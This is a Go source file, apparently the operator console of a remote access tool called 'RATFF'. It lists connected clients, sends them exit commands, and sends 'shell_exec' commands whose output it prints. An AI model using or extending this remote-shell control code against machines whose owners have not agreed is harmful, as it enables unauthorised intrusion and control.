package main

import (
	"time"

	"RATFF/shared"
)

// listClients fetches and displays connected clients.
func listClients() {
	clients, err := fetchClients()
	if err != nil {
		PrintError(Tf("fetch_clients_failed", err))
		return
	}

	PrintClientTable(clients)
}

// selectClient validates and selects a client by ID.
func selectClient(id string) bool {
	clients, err := fetchClients()
	if err != nil {
		PrintError(Tf("fetch_clients_failed", err))
		return false
	}

	for _, c := range clients {
		if c.ID == id {
			PrintSuccess(Tf("selected_client", id))
			return true
		}
	}

	PrintError(T("client_not_exists"))
	return false
}

// deleteClient sends an exit command to the specified client.
func deleteClient(id string) {
	clients, err := fetchClients()
	if err != nil {
		PrintError(Tf("fetch_clients_failed", err))
		return
	}

	found := false
	for _, c := range clients {
		if c.ID == id {
			found = true
			break
		}
	}

	if !found {
		PrintError(T("client_not_exists"))
		return
	}

	payload := map[string]interface{}{
		"client_id": id,
		"command":   "exit",
	}
	if err := postCommand(payload); err != nil {
		PrintError(Tf("send_exit_failed", err))
		return
	}

	PrintSuccess(T("delete_success"))
}

// sendShellCommand sends a shell command to a client and waits for response.
func sendShellCommand(id string, cmd string) {
	payload := map[string]interface{}{
		"client_id": id,
		"command":   "shell_exec",
		"payload":   map[string]interface{}{"cmd": cmd},
	}

	ch := make(chan shared.Message, 1)
	pendingMu.Lock()
	pendingCmd[id] = &pendingCommand{ch: ch}
	pendingMu.Unlock()

	if err := postCommand(payload); err != nil {
		PrintError(Tf("send_command_failed", err))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
		return
	}

	select {
	case msg := <-ch:
		if msg.Payload != nil {
			stdout := ""
			stderr := ""
			exitCode := 0

			if v, ok := msg.Payload["stdout"]; ok {
				if s, ok := v.(string); ok {
					stdout = s
				}
			}
			if v, ok := msg.Payload["stderr"]; ok {
				if s, ok := v.(string); ok {
					stderr = s
				}
			}
			if v, ok := msg.Payload["exit_code"]; ok {
				if code, ok := v.(float64); ok {
					exitCode = int(code)
				} else if code, ok := v.(int); ok {
					exitCode = code
				}
			}

			PrintCommandResult(stdout, stderr, exitCode)
		}
	case <-time.After(10 * time.Second):
		PrintError(T("command_timeout"))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
	}
}
